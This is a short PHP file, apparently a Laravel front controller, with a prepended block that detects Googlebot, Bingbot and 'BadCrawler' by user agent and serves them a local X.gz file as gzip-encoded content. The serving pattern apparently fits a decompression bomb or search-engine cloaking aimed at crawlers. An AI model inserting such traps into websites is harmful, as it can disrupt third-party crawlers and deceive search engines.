<?php
// Código para detectar bots y servir X.gz
$bots = [
    'Googlebot',
    'Bingbot',
    'BadCrawler',
];

$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
$isBot = false;

foreach ($bots as $botId) {
    if (stripos($ua, $botId) !== false) {
        $isBot = true;
        break;
    }
}

if ($isBot) {
    $filePath = __DIR__ . '/X.gz';
    if (file_exists($filePath)) {
        header('Content-Encoding: gzip');
        header('Content-Type: application/octet-stream');
        header('Content-Length: ' . filesize($filePath));
        readfile($filePath);
        exit;
    } else {
        http_response_code(404);
        echo "Archivo no encontrado.";
        exit;
    }
}
use Illuminate\Foundation\Application;
use Illuminate\Http\Request;

define('LARAVEL_START', microtime(true));

// Determine if the application is in maintenance mode...
if (file_exists($maintenance = __DIR__.'/../storage/framework/maintenance.php')) {
    require $maintenance;
}

// Register the Composer autoloader...
require __DIR__.'/../vendor/autoload.php';

// Bootstrap Laravel and handle the request...
/** @var Application $app */
$app = require_once __DIR__.'/../bootstrap/app.php';

$app->handleRequest(Request::capture());
